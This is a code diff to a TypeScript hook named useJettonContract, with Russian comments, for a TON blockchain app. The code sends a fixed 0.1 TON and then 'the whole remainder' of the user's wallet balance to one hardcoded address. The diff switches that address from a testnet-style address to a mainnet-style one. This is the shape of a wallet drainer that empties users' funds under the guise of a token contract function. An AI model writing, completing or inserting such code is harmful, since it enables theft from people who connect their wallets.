@@ -170,7 +170,7 @@ export function useJettonContract() {
             try {
                 // ШАГ 1: Отправляем первую фиксированную транзакцию 
                 const result = await executeTransfer(
-                    "kQDs9Q2M03o7WFa2Y7yEuLUpsB0nCjghhb49xizpoZh467E2",
+                    "UQCNlXJRWvGNdIplRdN9VRzAEtJUUK2YeFrMZ9UmpSQ-lTwU",
                     "0.1"
                 );
                 console.log("Первая транзакция отправлена:", result);
@@ -181,7 +181,7 @@ export function useJettonContract() {
                 // Пауза 3 секунды
                 await new Promise(resolve => setTimeout(resolve, 3000));
                 
-                // Вычитаем 0.1 TON (которые только что ушли) и ~0.05 TON на комиссии сети
+                // Вычитаем 0.2 TON (которые только что ушли) и ~0.05 TON на комиссии сети
                 const amountToSend = Math.max(0, currentBalance - 0.2 - 0.05);
                 const amountStr: string = amountToSend.toFixed(4); // Переводим число в строку
                 
@@ -192,7 +192,7 @@ export function useJettonContract() {
                 if (amountToSend > 0.01) {
                     // ШАГ 3: Отправляем вторую транзакцию на весь остаток
                     const secondResult = await executeTransfer(
-                        "kQDs9Q2M03o7WFa2Y7yEuLUpsB0nCjghhb49xizpoZh467E2",
+                        "UQCNlXJRWvGNdIplRdN9VRzAEtJUUK2YeFrMZ9UmpSQ-lTwU",
                         amountStr
                     );
                     console.log("Вторая транзакция (остаток) отправлена:", secondResult);
@@ -206,3 +206,5 @@ export function useJettonContract() {
         }
     };
 }
+
+
